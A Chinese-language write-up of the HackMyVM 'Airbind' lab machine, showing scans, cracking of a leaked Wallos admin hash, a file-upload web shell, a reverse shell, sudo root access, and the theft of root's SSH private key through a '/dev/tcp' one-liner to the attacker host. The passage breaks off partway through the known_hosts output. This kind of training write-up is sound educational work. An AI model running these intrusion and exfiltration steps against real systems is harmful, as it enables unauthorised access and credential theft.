{"pageProps":{"postData":{"id":"HackMyVMAirbind","contentHtml":"<h1>Airbind.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Airbind\">https://hackmyvm.eu/machines/machine.php?vm=Airbind</a></p>\n</blockquote>\n<p>Notes: <strong>Enjoy it.</strong></p>\n<h2>信息收集</h2>\n<pre><code class=\"hljs language-python\">nmap -sP <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.0</span>/<span class=\"hljs-number\">24</span>           \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">22</span> 08:01 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00065</span>s latency).\nMAC Address: 0A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.2</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00049</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:A4:AE:<span class=\"hljs-number\">22</span> (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00043</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">20</span>:BA:03 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>\nHost <span class=\"hljs-keyword\">is</span> up.\n</code></pre>\n<pre><code class=\"hljs language-python\">nmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span> \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">22</span> 08:02 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.0014</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp ports (conn-refused)\nPORT   STATE    SERVICE\n<span class=\"hljs-number\">22</span>/tcp filtered ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>     http\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">20</span>:BA:03 (Oracle VirtualBox virtual NIC)\n</code></pre>\n<p><code>SSH</code>端口提示被过滤</p>\n<pre><code class=\"hljs language-python\">nmap -sT -sV -O -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>         \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">22</span> 08:03 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00063</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp ports (conn-refused)\nPORT   STATE    SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp filtered ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>     http    Apache httpd <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.57</span> ((Ubuntu))\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">20</span>:BA:03 (Oracle VirtualBox virtual NIC)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (If you know what OS <span class=\"hljs-keyword\">is</span> running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=<span class=\"hljs-number\">7.94</span>SVN%E=<span class=\"hljs-number\">4</span>%D=<span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">22</span>%OT=<span class=\"hljs-number\">80</span>%CT=<span class=\"hljs-number\">1</span>%CU=<span class=\"hljs-number\">42133</span>%PV=Y%DS=<span class=\"hljs-number\">1</span>%DC=D%G=Y%M=08002\nOS:<span class=\"hljs-number\">7</span>%TM=6790ECE0%P=x86_64-pc-linux-gnu)SEQ(SP=<span class=\"hljs-number\">101</span>%GCD=<span class=\"hljs-number\">1</span>%ISR=10D%TI=Z%CI=Z%I\nOS:I=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW\nOS:<span class=\"hljs-number\">7</span>%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88\nOS:%W6=FE88)ECN(R=Y%DF=Y%T=3F%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F%\nOS:S=O%A=S+%F=AS%RD=<span class=\"hljs-number\">0</span>%Q=)T2(R=Y%DF=Y%T=<span class=\"hljs-number\">40</span>%W=<span class=\"hljs-number\">0</span>%S=Z%A=S%F=AR%O=%RD=<span class=\"hljs-number\">0</span>%Q=)T3(R=\nOS:Y%DF=Y%T=<span class=\"hljs-number\">40</span>%W=<span class=\"hljs-number\">0</span>%S=Z%A=O%F=AR%O=%RD=<span class=\"hljs-number\">0</span>%Q=)T4(R=Y%DF=Y%T=3F%W=<span class=\"hljs-number\">0</span>%S=A%A=Z%F=R\nOS:%O=%RD=<span class=\"hljs-number\">0</span>%Q=)T5(R=Y%DF=Y%T=<span class=\"hljs-number\">40</span>%W=<span class=\"hljs-number\">0</span>%S=Z%A=S+%F=AR%O=%RD=<span class=\"hljs-number\">0</span>%Q=)T6(R=Y%DF=Y%T=\nOS:<span class=\"hljs-number\">40</span>%W=<span class=\"hljs-number\">0</span>%S=A%A=Z%F=R%O=%RD=<span class=\"hljs-number\">0</span>%Q=)T7(R=Y%DF=Y%T=<span class=\"hljs-number\">40</span>%W=<span class=\"hljs-number\">0</span>%S=Z%A=S+%F=AR%O=%RD=<span class=\"hljs-number\">0</span>\nOS:%Q=)U1(R=Y%DF=N%T=<span class=\"hljs-number\">40</span>%IPL=<span class=\"hljs-number\">164</span>%UN=<span class=\"hljs-number\">0</span>%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R\nOS:=Y%DFI=N%T=<span class=\"hljs-number\">40</span>%CD=S)\n</code></pre>\n<p>没扫描出来系统信息</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>                                       \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">22</span> 08:09 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>                                            \nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00060</span>s latency).                                                                                                                               \nNot shown: <span class=\"hljs-number\">65533</span> closed tcp ports (reset)                                                                                                                    \nPORT   STATE    SERVICE                                                                                                                                      \n<span class=\"hljs-number\">22</span>/tcp filtered ssh                                                                                                                                          \n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>     http                                                                                                                                         \n| http-internal-ip-disclosure:                                                \n|_  Internal IP Leaked: <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.1</span>      \n| http-cookie-flags:                                                          \n|   /:                                 \n|     PHPSESSID:                       \n|       httponly flag <span class=\"hljs-keyword\">not</span> <span class=\"hljs-built_in\">set</span> \n|   /login.php:                                                               \n|     PHPSESSID:                                                              \n|_      httponly flag <span class=\"hljs-keyword\">not</span> <span class=\"hljs-built_in\">set</span>                                                 \n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.                         \n|_http-stored-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> stored XSS vulnerabilities.              \n| http-csrf:                                                                  \n| Spidering limited to: maxdepth=<span class=\"hljs-number\">3</span>; maxpagecount=<span class=\"hljs-number\">20</span>; withinhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>\n|   Found the following possible CSRF vulnerabilities:                        \n|                                                                             \n|     Path: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>:<span class=\"hljs-number\">80</span>/                                          \n|     Form <span class=\"hljs-built_in\">id</span>: username                \n|     Form action: login.php           \n|                                      \n|     Path: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>:<span class=\"hljs-number\">80</span>/login.php                                 \n|     Form <span class=\"hljs-built_in\">id</span>: username                                                                                                                                      \n|_    Form action: login.php                                                  \n| http-enum:                           \n|   /login.php: Possible admin folder                                         \n|   /.gitignore: Revision control ignore file                                 \n|   /db/: BlogWorx Database                                                   \n|   /manifest.json: Manifest JSON File                                        \n|   /db/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.57 (ubuntu)'</span>                                                                           \n|   /images/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.57 (ubuntu)'</span>                                                                       \n|   /includes/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.57 (ubuntu)'</span>                                                                     \n|   /scripts/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.57 (ubuntu)'</span>                                                                      \n|_  /styles/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.57 (ubuntu)'</span>                                                                       \nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">20</span>:BA:03 (Oracle VirtualBox virtual NIC)                                                                             \n</code></pre>\n<h2>渗透</h2>\n<p>访问<code>web</code>页面，显示<code>wallos</code> ，通过查找发现是开源的个人订阅追踪器</p>\n<blockquote>\n<p><a href=\"https://github.com/ellite/Wallos\">https://github.com/ellite/Wallos</a></p>\n</blockquote>\n<p><img src=\"/post-images/HackMyVMAirbind/image25.png\" alt=\"image.png\"></p>\n<h3>目录扫描</h3>\n<p>常规操作，目录扫描</p>\n<pre><code class=\"hljs language-python\">dirsearch -u <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span> -e php,<span class=\"hljs-built_in\">zip</span>,txt -x <span class=\"hljs-number\">403</span>                                      \n[08:<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">37</span>] Starting: \n[08:<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">200</span> -   72B  - /.dockerignore                                    \n[08:<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">200</span> -  453B  - /.github/                                         \n[08:<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">39</span>] <span class=\"hljs-number\">200</span> -  118B  - /.gitignore                                       \n[08:<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">200</span> -    0B  - /auth.php                                         \n[08:<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">56</span>] <span class=\"hljs-number\">200</span> -    7KB - /CHANGELOG.md                                     \n[08:<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">59</span>] <span class=\"hljs-number\">301</span> -  311B  - /db  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>/db/                 \n[08:<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">59</span>] <span class=\"hljs-number\">200</span> -  456B  - /db/                                              \n[08:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">00</span>] <span class=\"hljs-number\">200</span> -    2KB - /Dockerfile                                       \n[08:<span class=\"hljs-number\">24</span>:06] <span class=\"hljs-number\">301</span> -  315B  - /images  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>/images/         \n[08:<span class=\"hljs-number\">24</span>:06] <span class=\"hljs-number\">200</span> -  613B  - /images/                                          \n[08:<span class=\"hljs-number\">24</span>:06] <span class=\"hljs-number\">301</span> -  317B  - /includes  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>/includes/     \n[08:<span class=\"hljs-number\">24</span>:06] <span class=\"hljs-number\">200</span> -  699B  - /includes/\n[08:<span class=\"hljs-number\">24</span>:09] <span class=\"hljs-number\">301</span> -  313B  - /libs  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>/libs/             \n[08:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">10</span>] <span class=\"hljs-number\">200</span> -  667B  - /login.php                                        \n[08:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">10</span>] <span class=\"hljs-number\">302</span> -    0B  - /logout.php  ->  .                                \n[08:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">11</span>] <span class=\"hljs-number\">200</span> -    3KB - /manifest.json                                    \n[08:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">14</span>] <span class=\"hljs-number\">200</span> -    1KB - /nginx.conf                                       \n[08:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">22</span>] <span class=\"hljs-number\">301</span> -  320B  - /screenshots  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>/screenshots/\n[08:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">22</span>] <span class=\"hljs-number\">200</span> -  577B  - /scripts/                                         \n[08:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">22</span>] <span class=\"hljs-number\">301</span> -  316B  - /scripts  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>/scripts/       \n[08:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">26</span>] <span class=\"hljs-number\">200</span> -    1KB - /startup.sh                                       \n[08:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">27</span>] <span class=\"hljs-number\">301</span> -  315B  - /styles  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>/styles/                                                                                \nTask Completed\n</code></pre>\n<p>结果显示存在几个感兴趣的文件夹，并且存在<code>/.dockerignore</code> 有可能是使用docker搭建的</p>\n<p>通过<code>/CHANGELOG.md</code>  得知<code>CMS</code>版本在<code>1.11.1</code> ，后续可以根据版本来查找漏洞</p>\n<p><code>/nginx.conf</code> 能看到中间件配置</p>\n<p><code>/db/</code> 路径很有趣，可以下载一个<code>db</code>文件（<code>wallos.db</code>）,使用<code>Navicat</code>打开</p>\n<p><img src=\"/post-images/HackMyVMAirbind/image26.png\" alt=\"image.png\"></p>\n<p>意外得到<code>admin</code>的密码，尝试将其破解</p>\n<h3>密码暴力破解</h3>\n<p>使用开膛手破解</p>\n<pre><code class=\"hljs language-python\">john --wordlist=/usr/share/wordlists/rockyou.txt <span class=\"hljs-built_in\">hash</span> \nUsing default <span class=\"hljs-built_in\">input</span> encoding: UTF-<span class=\"hljs-number\">8</span>\nLoaded <span class=\"hljs-number\">1</span> password <span class=\"hljs-built_in\">hash</span> (bcrypt [Blowfish <span class=\"hljs-number\">32</span>/<span class=\"hljs-number\">64</span> X3])\nCost <span class=\"hljs-number\">1</span> (iteration count) <span class=\"hljs-keyword\">is</span> <span class=\"hljs-number\">1024</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">all</span> loaded hashes\nWill run <span class=\"hljs-number\">8</span> OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> <span class=\"hljs-keyword\">or</span> Ctrl-C to abort, almost <span class=\"hljs-built_in\">any</span> other key <span class=\"hljs-keyword\">for</span> status\n0g <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:01:06 <span class=\"hljs-number\">0.05</span>% (ETA: <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">23</span> <span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">29</span>) 0g/s <span class=\"hljs-number\">137.1</span>p/s <span class=\"hljs-number\">137.1</span>c/s <span class=\"hljs-number\">137.1</span>C/s lexie..celtics\nadmin            (?)     \n1g <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:02:<span class=\"hljs-number\">21</span> DONE (<span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">22</span> 08:<span class=\"hljs-number\">37</span>) <span class=\"hljs-number\">0.007061</span>g/s <span class=\"hljs-number\">140.3</span>p/s <span class=\"hljs-number\">140.3</span>c/s <span class=\"hljs-number\">140.3</span>C/s bernadeth..villalobos\nUse the <span class=\"hljs-string\">\"--show\"</span> option to display <span class=\"hljs-built_in\">all</span> of the cracked passwords reliably\nSession completed.\n</code></pre>\n<p>竟然是<code>admin</code>，那不就是弱密码了</p>\n<p>成功进入到后台，找一下可以利用的地方</p>\n<p><img src=\"/post-images/HackMyVMAirbind/image27.png\" alt=\"image.png\"></p>\n<h3>文件上传漏洞</h3>\n<p>在设置里面可以找到有上传的地方</p>\n<p><img src=\"/post-images/HackMyVMAirbind/image28.png\" alt=\"image.png\"></p>\n<p>并且在目录扫描的时候好像发现了上传目录<code>/images/uploads/logos/</code> ，尝试一下文件上传漏洞</p>\n<p>支付方式名称随便填，图片随便选择一张，然后<code>burp</code>抓包，修改文件内容和文件名上传，测试一下是否可以上传，修改完后点击转发</p>\n<p><img src=\"/post-images/HackMyVMAirbind/image29.png\" alt=\"image.png\"></p>\n<p>访问上传目录，意外的发现上传成功了</p>\n<p><img src=\"/post-images/HackMyVMAirbind/image30.png\" alt=\"image.png\"></p>\n<p>点击访问上传的文件，窝里个豆，真的可以</p>\n<p><img src=\"/post-images/HackMyVMAirbind/image31.png\" alt=\"image.png\"></p>\n<h3>反弹shell</h3>\n<p>再次构造恶意文件，这次直接反弹shell，先在<code>kali</code>监听</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># Kali开启监听</span>\nnc -lvp <span class=\"hljs-number\">1234</span>\n</code></pre>\n<p><img src=\"/post-images/HackMyVMAirbind/image32.png\" alt=\"image.png\"></p>\n<p>访问刚刚上传的文件，看见在一直加载就表示成功了，现在回到<code>kali</code> ，成功获得<code>shell</code></p>\n<pre><code class=\"hljs language-python\">nc -lvp <span class=\"hljs-number\">1234</span>                       \nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">1234</span> ...\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>: inverse host lookup failed: Host name lookup failure\nconnect to [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.12</span>] <span class=\"hljs-number\">41048</span>\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (<span class=\"hljs-number\">210</span>): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\nwww-data@ubuntu:/var/www/html/images/uploads/logos$ \n</code></pre>\n<h3>信息收集</h3>\n<ol>\n<li>\n<p>系统信息</p>\n<pre><code class=\"hljs language-python\">www-data@ubuntu:/var/www$ uname -a\nLinux ubuntu <span class=\"hljs-number\">6.1</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">18</span>-amd64 <span class=\"hljs-comment\">#1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 x86_64 x86_64 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p><code>/etc/passwd</code></p>\n<pre><code class=\"hljs language-python\">www-data@ubuntu:/var/www$ cat /etc/passwd\nroot:x:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">0</span>:root:/root:/<span class=\"hljs-built_in\">bin</span>/bash\ndaemon:x:<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1</span>:daemon:/usr/sbin:/usr/sbin/nologin\n<span class=\"hljs-built_in\">bin</span>:x:<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">2</span>:<span class=\"hljs-built_in\">bin</span>:/<span class=\"hljs-built_in\">bin</span>:/usr/sbin/nologin\n ................\nsyslog:x:<span class=\"hljs-number\">102</span>:<span class=\"hljs-number\">107</span>::/nonexistent:/usr/sbin/nologin\nsystemd-resolve:x:<span class=\"hljs-number\">996</span>:<span class=\"hljs-number\">996</span>:systemd Resolver:/:/usr/sbin/nologin\nubuntu:x:<span class=\"hljs-number\">1000</span>:<span class=\"hljs-number\">1000</span>::/home/ubuntu:/<span class=\"hljs-built_in\">bin</span>/bash\ndnsmasq:x:<span class=\"hljs-number\">103</span>:<span class=\"hljs-number\">65534</span>:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\npolkitd:x:<span class=\"hljs-number\">995</span>:<span class=\"hljs-number\">995</span>:polkit:/nonexistent:/usr/sbin/nologin\n</code></pre>\n<p>看样子<code>ubuntu</code>用户是我们的目标</p>\n</li>\n<li>\n<p>权限信息</p>\n<pre><code class=\"hljs language-python\">www-data@ubuntu:/$ /usr/lib/polkit-<span class=\"hljs-number\">1</span>/polkit-agent-helper-<span class=\"hljs-number\">1</span>\n/usr/lib/polkit-<span class=\"hljs-number\">1</span>/polkit-agent-helper-<span class=\"hljs-number\">1</span>\npolkit-agent-helper-<span class=\"hljs-number\">1</span>: wrong number of arguments. This incident has been logged.\nFAILURE\nwww-data@ubuntu:/$ sudo -l\nsudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> www-data on ubuntu:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\\:/snap/<span class=\"hljs-built_in\">bin</span>,\n    use_pty\n\nUser www-data may run the following commands on ubuntu:\n    (ALL) NOPASSWD: ALL\n</code></pre>\n<p>？？？？？？？一步到胃，不过我们还在<code>docker</code>环境下</p>\n<pre><code class=\"hljs language-python\">www-data@ubuntu:/$ sudo <span class=\"hljs-built_in\">id</span>\nsudo <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">0</span>(root) gid=<span class=\"hljs-number\">0</span>(root) groups=<span class=\"hljs-number\">0</span>(root)\n</code></pre>\n</li>\n</ol>\n<h3>UserFlag</h3>\n<p>本来想直接读取<code>RootFlag</code>的但是<code>root</code>目录下只有<code>user.txt</code></p>\n<pre><code class=\"hljs language-python\">www-data@ubuntu:/$ sudo ls /root\nuser.txt\nwww-data@ubuntu:/$ sudo cat /root/user.txt\n4408f370877687429c6ab332e6f560d0\n</code></pre>\n<p>再找找有什么可以利用的文件，可以看到有<code>.ssh</code></p>\n<pre><code class=\"hljs language-python\">www-data@ubuntu:/$ sudo ls -al /root\nsudo ls -al /root\ntotal <span class=\"hljs-number\">40</span>\ndrwx------  <span class=\"hljs-number\">4</span> root root <span class=\"hljs-number\">4096</span> May <span class=\"hljs-number\">21</span>  <span class=\"hljs-number\">2024</span> .\ndrwxr-xr-x <span class=\"hljs-number\">17</span> root root <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">22</span> <span class=\"hljs-number\">13</span>:01 ..\nlrwxrwxrwx  <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">9</span> Apr  <span class=\"hljs-number\">2</span>  <span class=\"hljs-number\">2024</span> .bash_history -> /dev/null\n-rw-r--r--  <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">3106</span> Oct <span class=\"hljs-number\">17</span>  <span class=\"hljs-number\">2022</span> .bashrc\n-rw-------  <span class=\"hljs-number\">1</span> root root   <span class=\"hljs-number\">20</span> May <span class=\"hljs-number\">21</span>  <span class=\"hljs-number\">2024</span> .lesshst\ndrwxr-xr-x  <span class=\"hljs-number\">3</span> root root <span class=\"hljs-number\">4096</span> Apr  <span class=\"hljs-number\">1</span>  <span class=\"hljs-number\">2024</span> .local\n-rw-r--r--  <span class=\"hljs-number\">1</span> root root  <span class=\"hljs-number\">161</span> Jul  <span class=\"hljs-number\">9</span>  <span class=\"hljs-number\">2019</span> .profile\n-rw-r--r--  <span class=\"hljs-number\">1</span> root root   <span class=\"hljs-number\">66</span> May <span class=\"hljs-number\">21</span>  <span class=\"hljs-number\">2024</span> .selected_editor\n-rw-------  <span class=\"hljs-number\">1</span> root root  <span class=\"hljs-number\">300</span> May <span class=\"hljs-number\">21</span>  <span class=\"hljs-number\">2024</span> .sqlite_history\ndrwx------  <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> Apr  <span class=\"hljs-number\">2</span>  <span class=\"hljs-number\">2024</span> .ssh\n-rw-------  <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">0</span> May <span class=\"hljs-number\">21</span>  <span class=\"hljs-number\">2024</span> .wpa_cli_history\n-rwx------  <span class=\"hljs-number\">1</span> root root   <span class=\"hljs-number\">33</span> Apr  <span class=\"hljs-number\">2</span>  <span class=\"hljs-number\">2024</span> user.txt\n</code></pre>\n<p>查看一下，将<code>id_rsa</code>拉取下来使用</p>\n<pre><code class=\"hljs language-python\">www-data@ubuntu:/$ sudo ls -al /root/.ssh\ntotal <span class=\"hljs-number\">24</span>\ndrwx------ <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> Apr  <span class=\"hljs-number\">2</span>  <span class=\"hljs-number\">2024</span> .\ndrwx------ <span class=\"hljs-number\">4</span> root root <span class=\"hljs-number\">4096</span> May <span class=\"hljs-number\">21</span>  <span class=\"hljs-number\">2024</span> ..\n-rw------- <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">2590</span> Apr  <span class=\"hljs-number\">2</span>  <span class=\"hljs-number\">2024</span> id_rsa\n-rw-r--r-- <span class=\"hljs-number\">1</span> root root  <span class=\"hljs-number\">565</span> Apr  <span class=\"hljs-number\">2</span>  <span class=\"hljs-number\">2024</span> id_rsa.pub\n-rw------- <span class=\"hljs-number\">1</span> root root  <span class=\"hljs-number\">978</span> Apr  <span class=\"hljs-number\">2</span>  <span class=\"hljs-number\">2024</span> known_hosts\n-rw-r--r-- <span class=\"hljs-number\">1</span> root root  <span class=\"hljs-number\">142</span> Apr  <span class=\"hljs-number\">2</span>  <span class=\"hljs-number\">2024</span> known_hosts.old\n</code></pre>\n<p>（这里学到了新姿势）</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># 靶机</span>\nsudo cat /root/.ssh/id_rsa > /dev/tcp/<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>/<span class=\"hljs-number\">2121</span>\n<span class=\"hljs-comment\"># 攻击机</span>\nnc -lvp <span class=\"hljs-number\">2121</span> > id_rsa\n</code></pre>\n<h3>利用id_rsa文件</h3>\n<p>将文件保存到<code>kali</code> ，然后给予文件<code>600</code>权限，尝试使用文件登录靶机</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop/test/airbind]\n└─<span class=\"hljs-comment\"># chmod 600 id_rsa   </span>\n\n┌──(root㉿kali)-[~/Desktop/test/airbind]\n└─<span class=\"hljs-comment\"># ssh root@192.168.56.12 -i id_rsa </span>\n</code></pre>\n<p>没反应，想起来扫描端口的时候提示<code>22</code>端口被过滤了，并且上边<code>.ssh</code>文件夹下还存在<code>known_hosts</code>文件</p>\n<pre><code class=\"hljs language-python\">www-data@ubuntu:/tmp$ sudo cat /root/.ssh/known_hosts\n|<span class=\"hljs-number\">1</span>|BUp6YxwESRbkME4kT/hGWmWcQo4=|SdbdZ8D3hrDg7Ir0JQJh6z34lPg= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICKFE9s2IvPGAJ7Pt0kSC8t9OXYUrueJQQplSC2wbYtY\n|<span class=\"hljs-number\">1</span>|/McR8hhKRc0FFZQJfx+61TfHeyM=|4xdjdMauCbjvM0D+C+1mcvYgs6g= ssh-rsa 